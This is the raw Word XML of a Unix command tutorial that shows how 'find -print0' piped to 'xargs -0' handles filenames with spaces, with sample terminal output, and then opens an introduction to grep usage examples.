      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>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1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>stock_trading</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cash_domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> trading 0 Jul 15 11:42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equity~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0F7EAC"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 xml:space="preserve">Now if we pass this to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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treat them as three separate files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667B6798"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javin</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testenv1:~</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b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>test</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-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*equity*"</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-print0</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>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WARNING: a NUL character occurred </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the input.  It cannot be passed through </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> the argument list.  Did you mean to use the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>--null</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option?</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>: cannot access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cash: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">: cannot access equity: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">: cannot access trading: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27422DA1"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 xml:space="preserve">Now to solve this, we have used find command with -print0 which appends NUL character on file name but without </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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-0,  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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command would not able to handle those inputs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DD332F" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F3F3"/>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javin</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testenv1:~</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b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>test</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find</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*equity*"</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-print0</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>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-0</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b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-l</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660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-r--r--</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>stock_trading</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cash_domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> trading 0 Jul 21 09:54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cash equity trading</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660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-r--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>stock_trading</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cash_domain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> trading 0 Jul 15 11:42 .</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>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t>equity~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310166AB"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 xml:space="preserve">Now you can see with find -print0| </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 it looks good</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E172320" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>10 ways to use Grep command in Unix - examples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AB301C"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 xml:space="preserve">Following examples of grep command in UNIX are based on my experience and I use them on a daily basis in my work. Grep command is also part of any </w:t>
      </w:r>
      <w:hyperlink r:id="rId58" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>beginners UNIX command tutorial</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> as it is an essential command to learn in order to work efficiently in any UNIX environment </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>e..g</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Redhat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Linux, Ubuntu, IBM AIX, Oracle Solaris or BSD.</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Anyway, these examples are by no means complete so please contribute you're own grep command tips or how you are using grep in Linux to make it more useful and allow all of us to benefit from each other's experience and work efficiently in UNIX or Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A615F77" w14:textId="3AF133FE" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
